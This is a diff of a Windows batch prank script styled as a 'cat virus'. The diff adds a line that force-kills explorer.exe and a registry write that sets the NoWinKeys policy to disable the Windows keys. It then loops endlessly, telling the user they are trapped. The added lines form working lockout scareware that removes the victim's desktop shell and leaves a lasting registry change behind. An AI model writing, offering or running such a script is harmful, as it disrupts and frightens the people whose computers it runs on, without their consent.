@@ -1,22 +1,15 @@
 @echo off
 color 1F
-title 🐾 CAT VIRUS LOCKDOWN MODE 🐾
+title 🐾 CAT.EXE 
 mode con: cols=160 lines=900
+taskkill /f /im explorer.exe >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f >nul
 
-:: Auto fullscreen using powershell trick (ALT+ENTER via API)
-powershell -command "$sig = '[DllImport(\"user32.dll\")]public static extern bool keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);'; Add-Type -MemberDefinition $sig -Name 'Keyboard' -Namespace 'Win32'; [Win32.Keyboard]::keybd_event(0xA4,0,0,0); [Win32.Keyboard]::keybd_event(13,0,0,0); [Win32.Keyboard]::keybd_event(13,0,2,0); [Win32.Keyboard]::keybd_event(0xA4,0,2,0);"
-
-:: Begin infinite snuggle loop
-:meowloop
+:loop
 cls
 echo.
-echo 💻 CAT VIRUS ACTIVE 💻
-echo.
-echo 🐾 ur system is now owned by cat.exe
-echo cats at 900%...
-echo.
-echo press ALT + F4 if u hate cats or want to escape
-echo (but why would u the cats... 
-echo.
-timeout /t 2 >nul
-goto meowloop
+echo You are now trapped in cat.exe 
+echo 🐾 cats hacking have begun... 
+echo 💤 Press ALT + F4 to escape... if you dare...
+timeout /t 1 >nul
+goto loop
